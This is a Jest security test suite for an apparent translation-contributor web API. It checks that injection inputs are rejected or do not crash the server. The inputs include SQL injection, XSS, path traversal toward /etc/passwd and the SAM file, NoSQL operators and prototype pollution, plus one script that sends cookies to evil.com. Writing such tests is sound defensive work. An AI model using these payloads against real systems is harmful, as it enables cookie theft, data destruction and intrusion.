'use strict';

/**
 * Security Test Suite 4 — Input Validation & Injection
 *
 * Covers: SQL injection surface (Prisma parameterization), XSS payloads in
 * text fields, type confusion attacks (array-as-string), oversized bodies,
 * null bytes, invalid enum values, path traversal strings in input, prototype
 * pollution, negative / boundary pagination.
 */

jest.mock('../../src/utils/prisma', () => ({
  contributor: {
    findUnique: jest.fn(), findFirst: jest.fn(), findMany: jest.fn(),
    create: jest.fn(), update: jest.fn(), updateMany: jest.fn(),
    delete: jest.fn(), count: jest.fn(), aggregate: jest.fn(),
  },
  translation: {
    findUnique: jest.fn(), findMany: jest.fn(), create: jest.fn(),
    update: jest.fn(), count: jest.fn(), aggregate: jest.fn(), groupBy: jest.fn(),
  },
  englishSample: {
    findUnique: jest.fn(), findFirst: jest.fn(), findMany: jest.fn(),
    create: jest.fn(), createMany: jest.fn(), update: jest.fn(), count: jest.fn(),
  },
  apiKey:    { findUnique: jest.fn(), create: jest.fn(), update: jest.fn(), updateMany: jest.fn(), findMany: jest.fn() },
  language:  { findMany: jest.fn(), create: jest.fn(), update: jest.fn(), delete: jest.fn(), findUnique: jest.fn() },
  auditLog:  { create: jest.fn(), findMany: jest.fn() },
  supportTicket: { create: jest.fn() },
  $queryRaw: jest.fn(),
  $transaction: jest.fn(),
}));

jest.mock('../../src/services/emailService', () => ({
  sendVerificationEmail:    jest.fn().mockResolvedValue(undefined),
  sendPasswordResetEmail:   jest.fn().mockResolvedValue(undefined),
  sendEmailChangeVerification: jest.fn().mockResolvedValue(undefined),
  sendInvitationEmail:      jest.fn().mockResolvedValue(undefined),
}));

jest.mock('bcryptjs', () => ({
  hash:    jest.fn().mockResolvedValue('$2a$12$testhash'),
  compare: jest.fn().mockResolvedValue(false),
}));

const request   = require('supertest');
const createApp = require('../helpers/createApp');
const { ADMIN_USER, tokenFor } = require('../helpers/fixtures');

const prismaMock = require('../../src/utils/prisma');

let app;
beforeAll(() => { app = createApp(); });
beforeEach(() => {
  jest.clearAllMocks();
  prismaMock.contributor.findUnique.mockResolvedValue(null);
  prismaMock.auditLog.create.mockResolvedValue({});
  prismaMock.language.findMany.mockResolvedValue([]);
});

// ═══════════════════════════════════════════════════════════════════════════════
// 1. SQL INJECTION — requests must not cause 500 errors
// ═══════════════════════════════════════════════════════════════════════════════

describe('SQL injection: Prisma parameterization', () => {
  const sqlPayloads = [
    "' OR '1'='1",
    "1; DROP TABLE contributors; --",
    "' UNION SELECT * FROM contributors --",
    "'; DELETE FROM english_samples; --",
    "1' AND SLEEP(5) --",
  ];

  sqlPayloads.forEach((payload) => {
    it(`registration with SQL payload in name does not cause 500: ${payload.slice(0, 30)}`, async () => {
      prismaMock.contributor.findUnique.mockResolvedValue(null);
      const res = await request(app).post('/api/auth/register').send({
        name: payload,
        email: 'sql@example.com',
        password: 'SecurePass123',
        native_language: 'kpelle',
        region_of_origin: 'Bong County',
        age_group: '18_35',
        is_l1_speaker: true,
      });
      expect(res.status).not.toBe(500);
    });

    it(`login with SQL payload in email field: ${payload.slice(0, 30)}`, async () => {
      const res = await request(app).post('/api/auth/login')
        .send({ email: payload, password: 'SecurePass123' });
      // Should be 422 (invalid email format) or 401 (not found), never 500
      expect(res.status).not.toBe(500);
      expect([400, 401, 422]).toContain(res.status);
    });

    it(`GET /api/contributors?sort= with SQL payload: ${payload.slice(0, 30)}`, async () => {
      prismaMock.contributor.findMany.mockResolvedValue([]);
      prismaMock.contributor.count.mockResolvedValue(0);
      const res = await request(app).get(`/api/contributors?sort=${encodeURIComponent(payload)}`);
      expect(res.status).not.toBe(500);
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 2. XSS PAYLOADS — server must not crash; content stored is separate concern
// ═══════════════════════════════════════════════════════════════════════════════

describe('XSS payloads: server handles safely', () => {
  const xssPayloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(document.cookie)>',
    'javascript:alert(1)',
    '"><svg onload=alert(1)>',
    '<script>alert(1)</script>',
  ];

  xssPayloads.forEach((payload) => {
    it(`registration with XSS in name does not crash server: ${payload.slice(0, 30)}`, async () => {
      prismaMock.contributor.findUnique.mockResolvedValue(null);
      prismaMock.contributor.create.mockResolvedValue({
        id: 'new-id', name: payload, email: 'xss@example.com',
        role: 'CONTRIBUTOR', is_admin: false, is_active: true,
        email_verified: false, is_profile_complete: false,
      });
      const res = await request(app).post('/api/auth/register').send({
        name: payload,
        email: 'xss@example.com',
        password: 'SecurePass123',
        native_language: 'kpelle',
        region_of_origin: 'Bong County',
        age_group: '18_35',
        is_l1_speaker: true,
      });
      expect(res.status).not.toBe(500);
    });
  });

  it('support ticket XSS payload in message does not crash server', async () => {
    prismaMock.supportTicket.create.mockResolvedValue({ id: 'ticket-1' });
    const res = await request(app).post('/api/tickets').send({
      name: 'Alice',
      email: 'alice@x.com',
      subject: 'Test',
      category: 'bug',
      message: '<script>document.location="https://evil.com/steal?c="+document.cookie</script>',
    });
    expect(res.status).not.toBe(500);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 3. TYPE CONFUSION — arrays/objects where strings expected
// ═══════════════════════════════════════════════════════════════════════════════

describe('Type confusion: array-as-string attacks', () => {
  it('email as array is rejected with 422', async () => {
    const res = await request(app).post('/api/auth/login')
      .send({ email: ['admin@example.com', 'second@example.com'], password: 'pass' });
    expect(res.status).toBe(422);
  });

  it('email as object is rejected', async () => {
    const res = await request(app).post('/api/auth/login')
      .send({ email: { $gt: '' }, password: 'pass' });
    expect(res.status).toBe(422);
  });

  it('password as array is handled without crashing', async () => {
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'test@example.com', password: ['a', 'b', 'c'] });
    expect(res.status).not.toBe(500);
  });

  it('age_group as object does not crash server', async () => {
    const res = await request(app).post('/api/auth/register').send({
      name: 'Test', email: 'test@x.com', password: 'SecurePass123',
      native_language: 'kpelle', region_of_origin: 'Bong',
      age_group: { $ne: null },
      is_l1_speaker: true,
    });
    expect(res.status).toBe(422);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 4. INVALID ENUM VALUES
// ═══════════════════════════════════════════════════════════════════════════════

describe('Invalid enum values: rejected with 422', () => {
  it('invalid domain in sample creation → 422', async () => {
    const adminToken = tokenFor(ADMIN_USER);
    const res = await request(app).post('/api/samples')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ text: 'A valid sentence', domain: 'INVALID_DOMAIN', difficulty: 'easy' });
    expect(res.status).toBe(422);
  });

  it('invalid difficulty in sample creation → 422', async () => {
    const adminToken = tokenFor(ADMIN_USER);
    const res = await request(app).post('/api/samples')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ text: 'A valid sentence', domain: 'general', difficulty: 'MEGA_HARD' });
    expect(res.status).toBe(422);
  });

  it('invalid ticket category → 400 or 422', async () => {
    const res = await request(app).post('/api/tickets').send({
      name: 'Alice', email: 'alice@x.com', subject: 'Help',
      category: 'HACK_THE_PLANET',
      message: 'I need help',
    });
    expect(res.status).not.toBe(500);
    expect([400, 422]).toContain(res.status);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 5. OVERSIZED PAYLOADS
// ═══════════════════════════════════════════════════════════════════════════════

describe('Oversized payloads', () => {
  it('JSON body exceeding 2 MB limit is rejected (413 or 400)', async () => {
    const huge = { data: 'x'.repeat(3 * 1024 * 1024) }; // 3 MB
    const res = await request(app).post('/api/auth/login')
      .set('Content-Type', 'application/json')
      .send(JSON.stringify(huge));
    expect([400, 413]).toContain(res.status);
  });

  it('very long translated_text (>5000 chars) in translation submission does not crash', async () => {
    const { tokenFor: tf, CONTRIBUTOR: C } = require('../helpers/fixtures');
    const token = tf(C);
    prismaMock.englishSample = {
      findUnique: jest.fn().mockResolvedValue({ id: 'sample-1', text: 'Hello', domain: 'general', difficulty: 'easy', is_locked: false }),
      findFirst: jest.fn(), findMany: jest.fn(), create: jest.fn(), createMany: jest.fn(), update: jest.fn(), count: jest.fn(),
    };
    Object.assign(prismaMock, { englishSample: prismaMock.englishSample });
    prismaMock.translation.findMany.mockResolvedValue([]);
    const res = await request(app).post('/api/translations')
      .set('Authorization', `Bearer ${token}`)
      .send({
        sample_id: 'sample-1',
        target_language: 'kpelle',
        translated_text: 'x'.repeat(6000), // exceeds 5000 char limit
      });
    // Should fail with validation error, not a 500
    expect(res.status).not.toBe(500);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 6. PATH TRAVERSAL IN QUERY PARAMETERS
// ═══════════════════════════════════════════════════════════════════════════════

describe('Path traversal: query parameters', () => {
  const traversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  ];

  traversalPayloads.forEach((payload) => {
    it(`path traversal in language param does not crash: ${payload.slice(0, 30)}`, async () => {
      prismaMock.contributor.findMany.mockResolvedValue([]);
      prismaMock.contributor.count.mockResolvedValue(0);
      const res = await request(app)
        .get(`/api/contributors?language=${encodeURIComponent(payload)}`);
      expect(res.status).not.toBe(500);
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 7. NULL BYTES & UNICODE ATTACKS
// ═══════════════════════════════════════════════════════════════════════════════

describe('Null bytes and special characters', () => {
  it('null byte in email field is rejected', async () => {
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'admin\x00@example.com', password: 'SecurePass123' });
    expect(res.status).not.toBe(500);
    expect([400, 401, 422]).toContain(res.status);
  });

  it('null byte in name field does not crash server', async () => {
    prismaMock.contributor.findUnique.mockResolvedValue(null);
    const res = await request(app).post('/api/auth/register').send({
      name: 'Admin\x00Hack',
      email: 'nullbyte@example.com',
      password: 'SecurePass123',
      native_language: 'kpelle',
      region_of_origin: 'Bong County',
      age_group: '18_35',
      is_l1_speaker: true,
    });
    expect(res.status).not.toBe(500);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 8. PROTOTYPE POLLUTION PREVENTION
// ═══════════════════════════════════════════════════════════════════════════════

describe('Prototype pollution prevention', () => {
  it('__proto__ in body does not pollute Object prototype', async () => {
    const pollutionPayload = '{"__proto__":{"isAdmin":true},"email":"x@x.com","password":"p"}';
    const res = await request(app)
      .post('/api/auth/login')
      .set('Content-Type', 'application/json')
      .send(pollutionPayload);
    // Request should not crash; whether it succeeds doesn't matter
    expect(res.status).not.toBe(500);
    // Check that Object prototype was not polluted
    expect(({} ).isAdmin).toBeUndefined();
  });

  it('constructor.prototype in body does not crash server', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .set('Content-Type', 'application/json')
      .send(JSON.stringify({
        'constructor': { 'prototype': { 'isAdmin': true } },
        email: 'x@x.com',
        password: 'p',
      }));
    expect(res.status).not.toBe(500);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 9. PAGINATION BOUNDARY ABUSE
// ═══════════════════════════════════════════════════════════════════════════════

describe('Pagination: boundary values', () => {
  beforeEach(() => {
    prismaMock.contributor.findMany.mockResolvedValue([]);
    prismaMock.contributor.count.mockResolvedValue(0);
  });

  it('page=0 does not crash', async () => {
    const res = await request(app).get('/api/contributors?page=0');
    expect(res.status).not.toBe(500);
  });

  it('page=-1 does not crash', async () => {
    const res = await request(app).get('/api/contributors?page=-1');
    expect(res.status).not.toBe(500);
  });

  it('limit=99999 (admin) is capped, not used raw', async () => {
    const adminToken = tokenFor(ADMIN_USER);
    prismaMock.contributor.findMany.mockResolvedValue([]);
    prismaMock.contributor.count.mockResolvedValue(0);
    const res = await request(app).get('/api/admin/users?limit=99999')
      .set('Authorization', `Bearer ${adminToken}`);
    // Should succeed but the query must apply a cap
    expect(res.status).not.toBe(500);
    if (res.status === 200 && prismaMock.contributor.findMany.mock.calls.length > 0) {
      const callArgs = prismaMock.contributor.findMany.mock.calls[0][0];
      // Limit should be capped to a reasonable value (≤ 100 per the controller)
      if (callArgs && callArgs.take) {
        expect(callArgs.take).toBeLessThanOrEqual(100);
      }
    }
  });
});
